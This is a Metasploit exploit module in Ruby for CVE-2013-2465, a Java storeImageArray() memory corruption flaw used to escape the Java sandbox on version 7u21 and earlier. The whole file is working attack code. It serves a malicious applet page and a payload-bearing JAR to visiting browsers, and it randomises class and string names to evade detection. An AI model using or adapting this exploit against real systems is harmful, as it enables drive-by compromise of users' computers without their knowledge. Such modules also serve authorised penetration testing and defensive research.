# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;rex&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking # Because there isn&#039;t click2play bypass, plus now Java Security Level High by default

  include Msf::Exploit::Remote::HttpServer::HTML

  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({ :javascript => false })

  def initialize( info = {} )
    super( update_info( info,
      &#039;Name&#039;          => &#039;Java storeImageArray() Invalid Array Indexing Vulnerability&#039;,
      &#039;Description&#039;   => %q{
        This module abuses an Invalid Array Indexing Vulnerability on the
        static function storeImageArray() function in order to produce a
        memory corruption and finally escape the Java Sandbox. The vulnerability
        affects Java version 7u21 and earlier. The module, which doesn&#039;t bypass
        click2play, has been tested successfully on Java 7u21 on Windows and
        Linux systems.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        =>
        [
          &#039;Unknown&#039;,  # From PacketStorm
          &#039;sinn3r&#039;, # Metasploit
          &#039;juan vazquez&#039; # Metasploit
        ],
      &#039;References&#039;    =>
        [
          [ &#039;CVE&#039;, &#039;2013-2465&#039; ],
          [ &#039;OSVDB&#039;, &#039;96269&#039; ],
          [ &#039;EDB&#039;, &#039;27526&#039; ],
          [ &#039;URL&#039;, &#039;http://packetstormsecurity.com/files/122777/&#039; ],
          [ &#039;URL&#039;, &#039;http://hg.openjdk.java.net/jdk7u/jdk7u-dev/jdk/rev/2a9c79db0040&#039; ]
        ],
      &#039;Platform&#039;      => [ &#039;java&#039;, &#039;win&#039;, &#039;linux&#039; ],
      &#039;Payload&#039;       => { &#039;Space&#039; => 20480, &#039;BadChars&#039; => &#039;&#039;, &#039;DisableNops&#039; => true },
      &#039;Targets&#039;       =>
        [
          [ &#039;Generic (Java Payload)&#039;,
            {
              &#039;Arch&#039;     => ARCH_JAVA,
              &#039;Platform&#039; => &#039;java&#039;
            }
          ],
          [ &#039;Windows Universal&#039;,
            {
              &#039;Arch&#039;     => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [ &#039;Linux x86&#039;,
            {
              &#039;Arch&#039;     => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 12 2013&#039;
      ))
  end

  def setup
    path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2013-2465", "Exploit.class")
    @exploit_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2013-2465", "Exploit$MyColorModel.class")
    @color_model_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2013-2465", "Exploit$MyColorSpace.class")
    @color_space_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }

    @exploit_class_name = rand_text_alpha("Exploit".length)
    @color_model_class_name = rand_text_alpha("MyColorModel".length)
    @color_space_class_name = rand_text_alpha("MyColorSpace".length)

    @exploit_class.gsub!("Exploit", @exploit_class_name)
    @exploit_class.gsub!("MyColorModel", @color_model_class_name)
    @exploit_class.gsub!("MyColorSpace", @color_space_class_name)

    @color_model_class.gsub!("Exploit", @exploit_class_name)
    @color_model_class.gsub!("MyColorModel", @color_model_class_name)
    @color_model_class.gsub!("MyColorSpace", @color_space_class_name)


    @color_space_class.gsub!("Exploit", @exploit_class_name)
    @color_space_class.gsub!("MyColorModel", @color_model_class_name)
    @color_space_class.gsub!("MyColorSpace", @color_space_class_name)

    super
  end

  def on_request_uri( cli, request )
    print_debug("Requesting: #{request.uri}")
    if request.uri !~ /\.jar$/i
      if not request.uri =~ /\/$/
        print_status("Sending redirect...")
        send_redirect(cli, "#{get_resource}/", &#039;&#039;)
        return
      end

      print_status("Sending HTML...")
      send_response_html(cli, generate_html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
      return
    end

    print_status("Sending .jar file...")
    send_response(cli, generate_jar(cli), {&#039;Content-Type&#039;=>&#039;application/java-archive&#039;})

    handler( cli )
  end

  def generate_html
    jar_name = rand_text_alpha(5+rand(3))
    html = %Q|<html>
    <head>
    </head>
    <body>
    <applet archive="#{jar_name}.jar" code="#{@exploit_class_name}" width="1000" height="1000">
    </applet>
    </body>
    </html>
    |
    html = html.gsub(/^\t\t/, &#039;&#039;)
    return html
  end

  def generate_jar(cli)

    p = regenerate_payload(cli)
    jar  = p.encoded_jar

    jar.add_file("#{@exploit_class_name}.class", @exploit_class)
    jar.add_file("#{@exploit_class_name}$#{@color_model_class_name}.class", @color_model_class)
    jar.add_file("#{@exploit_class_name}$#{@color_space_class_name}.class", @color_space_class)
    metasploit_str = rand_text_alpha("metasploit".length)
    payload_str = rand_text_alpha("payload".length)
    jar.entries.each { |entry|
      entry.name.gsub!("metasploit", metasploit_str)
      entry.name.gsub!("Payload", payload_str)
      entry.data = entry.data.gsub("metasploit", metasploit_str)
      entry.data = entry.data.gsub("Payload", payload_str)
    }
    jar.build_manifest

    return jar.pack
  end

end

